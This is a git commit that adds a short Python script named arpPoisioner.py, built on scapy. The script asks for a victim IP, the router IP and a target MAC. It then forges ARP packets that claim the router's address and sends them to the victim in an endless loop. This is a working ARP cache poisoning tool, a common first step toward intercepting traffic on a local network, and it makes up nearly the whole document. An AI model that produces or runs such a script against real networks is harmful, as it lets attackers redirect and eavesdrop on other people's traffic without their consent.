6d6e81d76f7d663a5a02472766e5f226bb637f63
root <root@localhost.localdomain>
2017-11-16 00:43:48 -0500

    Arp Poisioner added

---
+++ ArpPoisioner/arpPoisioner.py
@@ -0,0 +1,22 @@
+#!/usr/bin/python
+
+from scapy.all import *
+from subprocess import call
+import time
+
+#Opcode for ARP Request is 1 , for reply is 2
+opcode = 1
+victimIP = raw_input('Enter the Victim IP Address: ')
+victimIP = victimIP.replace(" ","")
+
+spoof = raw_input('Enter the Router IP: ')
+spoof = spoof.replace(" ","")
+
+mac = raw_input('Enter the target MAC to hack: ')
+mac = mac.replace("-",":")
+mac = mac.replace(" ","")
+
+arp= ARP(op=opcode , psrc=spoof , pdst=victimIP , hwdst=mac)
+
+while 1:
+    send(arp)
